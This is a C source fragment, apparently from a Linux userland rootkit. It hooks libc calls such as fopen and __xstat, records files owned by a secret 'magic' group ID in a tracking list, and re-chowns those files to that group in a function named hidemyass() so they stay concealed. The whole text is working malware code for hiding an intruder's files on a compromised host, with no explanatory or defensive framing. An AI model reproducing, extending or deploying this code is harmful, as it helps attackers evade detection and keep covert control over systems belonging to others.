int pathtracked(const char *pathname){
    if(strstr(pathname, INSTALL_DIR))
        return 1;

    hook(CFOPEN, C__XSTAT);

    struct stat assstat;
    memset(&assstat, 0, sizeof(struct stat));
    if((long)call(C__XSTAT, _STAT_VER, pathname, &assstat) < 0)
        return 1;

    // only track reg files that belong to us...
    if(!S_ISREG(assstat.st_mode) || assstat.st_gid != readgid())
        return 1;
    
    if(!strncmp("/proc", pathname, 5))
        return 1;

    if(strstr(pathname, "swp")){ // ignore very temporary swp files
        char *pathnamedup = strdup(pathname),
             *pathnametok = strtok(pathnamedup, ".");
        int count = 0;
        while(pathnametok != NULL){
            if(!strncmp(pathnametok, "swp", 3) && count > 1){
                free(pathnamedup);
                return 1;
            }
            count++;
            pathnametok = strtok(NULL, ".");
        }
        free(pathnamedup);
    }

    int tracked = 0;
    FILE *fp;
    char line[PATH_MAX];
    memset(line, 0, sizeof(line));
    
    fp = call(CFOPEN, ASS_PATH, "r");
    if(fp == NULL) return 1; // cant open the file..just say ok?
    
    while(fgets(line, sizeof(line), fp) != NULL){
        if(!strcmp(line, pathname)){
            tracked = 1;
            break;
        }
    }
    fclose(fp);

    return tracked;
}

void trackwrite(const char *pathname){
    FILE *fp;
    char buf[strlen(pathname)+2];
    hook(CFOPEN, CFWRITE);
    if(pathtracked(pathname)) return;
    fp = call(CFOPEN, ASS_PATH, "a+");
    if(fp == NULL) return;
    snprintf(buf, sizeof(buf), "%s\n", pathname);
    call(CFWRITE, buf, 1, strlen(buf), fp);
    fclose(fp);
}

void hidemyass(void){
    FILE *fp;
    struct stat assstat;
    gid_t magicgid;

    hook(CFOPEN, C__XSTAT);

    fp = call(CFOPEN, ASS_PATH, "r");

    if(fp != NULL){
        char line[PATH_MAX];
        memset(line, 0, sizeof(line));
        magicgid = readgid();
        while(fgets(line, sizeof(line), fp) != NULL){
            line[strlen(line)-1]='\0';

            memset(&assstat, 0, sizeof(struct stat));
            if((long)call(C__XSTAT, _STAT_VER, line, &assstat) < 0)
                continue;

            // if the path has been unhidden after creation this makes sure it is ignored.
            if(assstat.st_gid != 0)
                chown_path(line, magicgid);
        }

        fclose(fp);
    }
}
